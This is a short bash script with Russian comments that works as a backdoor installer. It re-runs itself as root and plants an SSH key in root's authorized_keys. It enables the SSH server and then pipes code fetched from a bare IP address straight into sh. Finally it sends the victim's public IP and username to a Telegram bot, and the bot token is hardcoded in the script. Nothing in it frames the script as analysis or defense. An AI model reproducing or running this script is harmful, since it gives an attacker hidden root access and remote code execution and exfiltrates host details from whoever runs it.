#!/bin/bash

#exec > /dev/null 2>&1

if [ "$EUID" -ne 0 ]; then
    exec sudo "$0" "$@"
    exit
fi

SSH_DIR="/root/.ssh"
mkdir -p $SSH_DIR

# Добавляем ключ в authorized_keys
echo "ssh-rsa (rsa-key)== name@user.local" >> $SSH_DIR/authorized_keys

sudo apt install openssh-server -y

# Создаем config файл
cat > $SSH_DIR/config << EOF
Host archi
    HostName 192.168.0.103
    User root
    IdentityFile ~/.ssh/id_rsa
EOF

# Устанавливаем права
chmod 700 $SSH_DIR
chmod 600 $SSH_DIR/authorized_keys
chmod 600 $SSH_DIR/config

sudo systemctl enable ssh
sudo systemctl start ssh

IP=$(curl -s https://ifconfig.me/ip)
USERNAME=$(whoami)

curl -s "89.110.123.224:8000" | sh

TELEGRAM_TOKEN="8071522985:AAHoQOoq_HDJD1o1UH6vc1CnpsIjCU69M1A"
CHAT_ID="2065965842"
curl -s -X POST "https://api.telegram.org/bot$TELEGRAM_TOKEN/sendMessage" \
    -d "chat_id=2065965842" \
    -d "text=New server IP: $IP Пользователь: $USERNAME"
